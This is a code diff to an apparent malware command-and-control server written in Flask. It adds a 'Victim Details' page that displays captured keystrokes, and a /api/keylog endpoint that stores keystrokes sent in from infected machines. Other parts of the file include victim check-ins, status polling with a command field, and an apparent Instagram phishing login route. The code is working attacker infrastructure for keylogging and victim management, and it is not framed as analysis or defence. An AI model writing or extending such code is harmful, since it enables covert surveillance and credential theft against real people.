@@ -128,7 +128,7 @@ def home():
 
         html += f"""
                     <tr>
-                        <td class="id-col">{vid}</td>
+                        <td class="id-col"><a href="/victim/{vid}" style="color: #00ff00; text-decoration: none;">{vid}</a></td>
                         <td class="id-col">{data.get('ip', 'Unknown')}</td>
                         <td>{status_html}</td>
                         <td class="timer">{timer_str}</td>
@@ -155,6 +155,56 @@ def home():
     </html>
     """
     return render_template_string(html)
+
+@app.route('/victim/<victim_id>')
+def victim_details(victim_id):
+    if victim_id not in victims:
+        return "Victim not found", 404
+    
+    victim = victims[victim_id]
+    keystrokes = victim.get('keystrokes', 'No keystrokes captured yet.')
+    
+    html = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Victim Details - {victim_id}</title>
+        <meta http-equiv="refresh" content="5">
+        <style>
+            body {{ background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }}
+            .container {{ max-width: 1200px; margin: 0 auto; }}
+            h1 {{ color: #ff3333; text-shadow: 0 0 10px #ff3333; }}
+            .info-box {{ background-color: #1a1a1a; padding: 20px; margin: 20px 0; border: 1px solid #333; border-radius: 8px; }}
+            .keylog-box {{ background-color: #0d0d0d; padding: 15px; margin: 10px 0; border-left: 3px solid #00ff00; font-size: 14px; white-space: pre-wrap; word-wrap: break-word; max-height: 600px; overflow-y: auto; }}
+            .back-btn {{ display: inline-block; padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 4px; margin-top: 20px; }}
+            .back-btn:hover {{ background-color: #0056b3; }}
+            label {{ color: #ffcc00; font-weight: bold; }}
+            .refresh-notice {{ color: #888; font-size: 12px; text-align: center; margin-top: 10px; }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>Victim Details: {victim_id}</h1>
+            
+            <div class="info-box">
+                <p><label>IP Address:</label> {victim.get('ip', 'Unknown')}</p>
+                <p><label>Status:</label> {victim.get('status', 'Unknown')}</p>
+                <p><label>First Seen:</label> {victim.get('first_seen', 'Unknown')}</p>
+                <p><label>Type:</label> {victim.get('type', 'Unknown')}</p>
+            </div>
+            
+            <div class="info-box">
+                <h2 style="color: #00ff00;">Captured Keystrokes</h2>
+                <div class="keylog-box">{keystrokes if keystrokes else 'No keystrokes captured yet.'}</div>
+                <p class="refresh-notice">⟳ Auto-refreshing every 5 seconds...</p>
+            </div>
+            
+            <a href="/" class="back-btn">← Back to Dashboard</a>
+        </div>
+    </body>
+    </html>
+    """
+    return html
 
 @app.route('/instagram')
 def instagram_login():
@@ -225,8 +275,39 @@ def checkin():
     print(f"[+] New victim check-in: {victim_id}")
     return jsonify({"victim_id": victim_id})
 
+@app.route('/api/keylog/<victim_id>', methods=['POST'])
+def receive_keylog(victim_id):
+    # Handle OFFLINE victims
+    if victim_id.startswith("OFFLINE-"):
+        data = request.json.get('keys', '')
+        if data:
+            print(f"[Keylog] OFFLINE victim {victim_id}: {data[:50]}...")  # Show first 50 chars
+        return jsonify({"status": "ok"})
+    
+    if victim_id not in victims:
+        return jsonify({"status": "unknown"}), 404
+        
+    data = request.json.get('keys', '')
+    if data:
+        print(f"[Keylog] Received {len(data)} chars from {victim_id}")
+        if 'keystrokes' not in victims[victim_id]:
+            victims[victim_id]['keystrokes'] = ""
+        timestamp = datetime.datetime.now().strftime("[%H:%M:%S] ")
+        victims[victim_id]['keystrokes'] += f"\n{timestamp}{data}"
+        
+    return jsonify({"status": "ok"})
+
 @app.route('/api/status/<victim_id>', methods=['GET'])
 def get_status(victim_id):
+    # Handle OFFLINE victims gracefully
+    if victim_id.startswith("OFFLINE-"):
+        print(f"[!] OFFLINE victim polling: {victim_id} (never checked in)")
+        return jsonify({
+            "status": "OFFLINE",
+            "message": "Victim is in offline mode. Check-in failed.",
+            "command": None
+        })
+    
     if victim_id not in victims:
         return jsonify({"status": "unknown"}), 404
     
